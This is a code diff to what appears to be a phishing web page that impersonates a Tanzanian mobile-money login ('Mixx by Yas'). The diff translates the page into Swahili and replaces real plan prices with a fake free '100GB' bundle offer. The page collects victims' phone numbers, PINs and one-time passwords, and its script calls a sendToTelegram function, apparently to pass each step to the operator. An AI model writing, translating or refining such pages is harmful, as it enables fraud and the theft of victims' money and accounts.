@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Mixx by Yas Login</title>
+<title>Pokea Bundle</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
 
@@ -237,19 +237,19 @@ opacity:1;
 
 <img src="assets/logo.svg" class="logo">
 
-<h1>Login</h1>
+<h1>Pokea Bundle</h1>
 
-<label>Phone Number</label>
+<label>Namba ya Simu</label>
 
 <div class="phone-group">
 <input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="0XXX XXX XXX">
 </div>
 
 <div class="warning">
-Enter your 10-digit mobile number starting with 0.
+Weka namba yako ya simu yenye tarakimu 10 ikianzia na 0.
 </div>
 
-<label>Enter your PIN</label>
+<label>Weka PIN yako</label>
 
 <div class="pin">
 <input maxlength="1" inputmode="numeric">
@@ -258,7 +258,7 @@ Enter your 10-digit mobile number starting with 0.
 <input maxlength="1" inputmode="numeric">
 </div>
 
-<button id="loginBtn" class="btn">Login</button>
+<button id="loginBtn" class="btn">Endelea</button>
 
 </div>
 
@@ -268,7 +268,7 @@ Enter your 10-digit mobile number starting with 0.
 
 <img src="assets/logo.svg" class="logo">
 
-<h1>OTP Verification</h1>
+<h1>Uthibitisho wa OTP</h1>
 
 <div class="warning" id="maskedNumber"></div>
 
@@ -280,14 +280,14 @@ Enter your 10-digit mobile number starting with 0.
 </div>
 
 <div class="count">
-Code expires in <span id="time">120</span>s
+Muda wa OTP kuisha: <span id="time">120</span>s
 </div>
 
 <div class="resend">
-<button id="resendBtn">Resend OTP</button>
+<button id="resendBtn">Tuma tena OTP</button>
 </div>
 
-<button id="otpBtn" class="btn">Submit</button>
+<button id="otpBtn" class="btn">Thibitisha</button>
 
 </div>
 
@@ -297,10 +297,10 @@ Code expires in <span id="time">120</span>s
 
 <img src="assets/logo.svg" class="logo">
 
-<h1>Success</h1>
+<h1>Imefanikiwa</h1>
 
 <div class="warning">
-Processing request...
+Tafadhali subiri tunachakata ombi lako...
 </div>
 
 </div>
@@ -323,17 +323,14 @@ selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))
 }catch(e){}
 
 const priceMap={
-"15GB":"TZS 999",
-"35GB":"TZS 1999",
-"50GB":"TZS 2999",
-"Unlimited":"TZS 3999"
+"100GB":"BURE"
 }
 
 function getPlanLine(){
 
-if(!selectedPlan) return "Unknown plan"
+if(!selectedPlan) return "Ofa haijapatikana"
 
-let name=selectedPlan.name||selectedPlan.shortName||"Plan"
+let name=selectedPlan.name||selectedPlan.shortName||"Bundle"
 
 let price=selectedPlan.price
 
@@ -473,7 +470,7 @@ sendToTelegram("login_clicked")
 
 const masked=phoneValue.replace(/(0\d{3})\d{4}(\d{3})/,"$1****$2")
 
-maskedNumber.innerHTML=`Enter the OTP sent to ${masked}`
+maskedNumber.innerHTML=`Weka OTP iliyotumwa kwenda ${masked}`
 
 show("step3")
 
@@ -596,7 +593,7 @@ otpInputs.forEach(i=>i.disabled=true)
 
 otpBtn.classList.remove("active")
 
-maskedNumber.innerHTML="Code expired. Request new OTP"
+maskedNumber.innerHTML="Muda wa OTP umeisha. Omba OTP mpya"
 
 }
 
